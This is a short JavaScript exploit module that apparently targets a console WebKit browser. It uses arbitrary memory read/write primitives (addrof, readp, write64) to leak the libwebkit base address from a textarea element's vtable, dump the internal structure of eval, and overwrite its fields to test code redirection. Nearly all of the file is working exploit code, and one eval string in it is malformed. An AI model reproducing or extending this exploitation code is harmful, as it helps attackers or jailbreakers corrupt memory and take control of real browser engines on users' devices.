import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { Addr, mem } from './module/mem.mjs';
import { make_buffer, find_base, resolve_import } from './module/memtools.mjs';
import { KB, MB } from './module/constants.mjs';

import {
    debug_log,
    align,
    die,
    send,
} from './module/utils.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const textarea = document.createElement('textarea');
// JSObject
const js_textarea = mem.addrof(textarea);

function dump_eval() {
    let addr = js_textarea;
    // WebCore::HTMLTextAreaElement
    addr = addr.readp(0x18);

    // vtable for WebCore::HTMLTextAreaElement
    // in PT_SCE_RELRO segment (p_type = 0x6100_0010)
    addr = addr.readp(0);

    const libwebkit_base =  find_base(addr, true, true);
    const func = mem.addrof(eval).readp(0x18);

    debug_log(`base: ${libwebkit_base}`);
    for (let i = 0; i < 0x50; i += 8) {
        debug_log(`${i.toString(16)}: ${func.read64(i)}`);
    }
}

function code_redirect() {
    const func = mem.addrof(eval).readp(0x18);

    for (let i = 0x28; i < 0x50; i += 8) {
        alert(`test ${i.toString(16)}`);
        let old = func.read64(i);
        func.write64(i, Int.Zero);
        func("alert('no crash, next...");
        func.write64(i, old);
    }
}

//dump_eval();
code_redirect();
